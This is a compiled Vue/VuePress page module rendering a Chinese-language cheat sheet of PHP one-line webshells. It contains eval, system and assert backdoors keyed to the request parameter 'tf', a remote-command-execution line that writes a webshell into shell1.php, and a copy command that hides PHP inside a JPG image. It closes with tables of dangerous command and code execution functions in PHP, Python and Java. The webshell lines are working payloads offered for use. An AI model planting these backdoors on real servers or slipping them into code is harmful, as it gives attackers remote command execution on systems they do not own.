import{_ as a,W as n,X as s,a1 as t}from"./framework-b6a07282.js";const p={},e=t(`<h2 id="一句话木马集合" tabindex="-1"><a class="header-anchor" href="#一句话木马集合" aria-hidden="true">#</a> 一句话木马集合</h2><h3 id="php" tabindex="-1"><a class="header-anchor" href="#php" aria-hidden="true">#</a> PHP</h3><h4 id="一句话木马" tabindex="-1"><a class="header-anchor" href="#一句话木马" aria-hidden="true">#</a> 一句话木马</h4><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> #蚂剑直连
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>	//?tf=whoami
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span>@<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>	//POST传参tf=system(&#39;whoami&#39;)或GET传参?tf=phpinfo()
<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;tf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>php<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">&#39;tf&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> 后缀phtml，php3，pht，phps
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>php</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">&quot;whoami&quot;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
fputs(fopen(&#39;shell1.php&#39;,&#39;w&#39;),&#39;<span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;tf&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>&#39;)	//配置远程命令执行写入一句话木马
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="图片马" tabindex="-1"><a class="header-anchor" href="#图片马" aria-hidden="true">#</a> 图片马</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>copy test.png /b + test.php /a shell.jpg
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="常见的危险函数" tabindex="-1"><a class="header-anchor" href="#常见的危险函数" aria-hidden="true">#</a> 常见的危险函数</h3><h4 id="php-1" tabindex="-1"><a class="header-anchor" href="#php-1" aria-hidden="true">#</a> PHP</h4><h5 id="命令command注入" tabindex="-1"><a class="header-anchor" href="#命令command注入" aria-hidden="true">#</a> 命令command注入</h5><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>system()</td><td>执行外部程序，并且显示输出</td></tr><tr><td>exec()/shell_exec()</td><td>通过shell环境执行命令，并且将完整的输出以字符串的方式返回</td></tr><tr><td>pcntl_exec()</td><td>在当前进程空间执行指定程序</td></tr><tr><td>passthru()</td><td>执行外部程序并且显示原始输出</td></tr><tr><td>popen()</td><td>打开进程文件指针</td></tr><tr><td>proc_open()</td><td>执行一个命令，并且打开用来输入/输出的文件指针</td></tr></tbody></table><h5 id="代码code注入" tabindex="-1"><a class="header-anchor" href="#代码code注入" aria-hidden="true">#</a> 代码code注入</h5><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>eval()</td><td>把字符串code作为PHP代码执行</td></tr><tr><td>assert()</td><td>检查一个断言是否为false</td></tr><tr><td>preg_replace()</td><td>执行一个正则表达式的搜索和替换</td></tr><tr><td>create_function()</td><td>创建一个匿名函数并且返回函数名称</td></tr><tr><td>call_user_func()/ca ll_user_func_array()</td><td>把第一个参数作为回调函数调用</td></tr><tr><td>usort()/uasort()</td><td>使用用户自定义的比较函数对数组中的值 进行排序并保持索引关联</td></tr></tbody></table><h4 id="python" tabindex="-1"><a class="header-anchor" href="#python" aria-hidden="true">#</a> Python</h4><ul><li>system</li><li>popen</li><li>subprocess.call</li><li>spawn</li></ul><h4 id="java" tabindex="-1"><a class="header-anchor" href="#java" aria-hidden="true">#</a> Java</h4><ul><li>java.lang.Runtime.getRuntime().exec(command)</li></ul>`,16),o=[e];function c(l,i){return n(),s("div",null,o)}const d=a(p,[["render",c],["__file","一句话木马集合.html.vue"]]);export{d as default};
